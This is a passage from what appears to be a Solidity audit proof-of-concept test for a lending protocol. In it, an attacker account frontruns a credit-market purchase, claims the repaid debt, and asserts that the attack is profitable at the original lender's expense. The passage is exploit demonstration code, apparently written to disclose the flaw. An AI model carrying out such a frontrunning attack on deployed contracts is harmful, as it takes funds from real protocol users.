        _buyCreditMarket(candy, creditPositionId , futureValue, false);  

        //Bob repays
        _repay(bob, debtPositionId);

        //Candy claims
        _claim(candy, size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0]);

        Vars memory _after_WithFrontrun = _state();


        //Results:
        //Wihtout the frontrunner alice would have got a greater revenue
        assertGt(_after_WithoutFrontrun.alice.borrowATokenBalance, _after_WithFrontrun.alice.borrowATokenBalance);
        console.log(_after_WithoutFrontrun.alice.borrowATokenBalance);
        console.log(_after_WithFrontrun.alice.borrowATokenBalance);

        //The front run was profitable
        assertGt(_after_WithFrontrun.candy.borrowATokenBalance, _before_WithFrontrun.candy.borrowATokenBalance);
        console.log(_after_WithFrontrun.candy.borrowATokenBalance);
        console.log(_before_WithFrontrun.candy.borrowATokenBalance);
    }
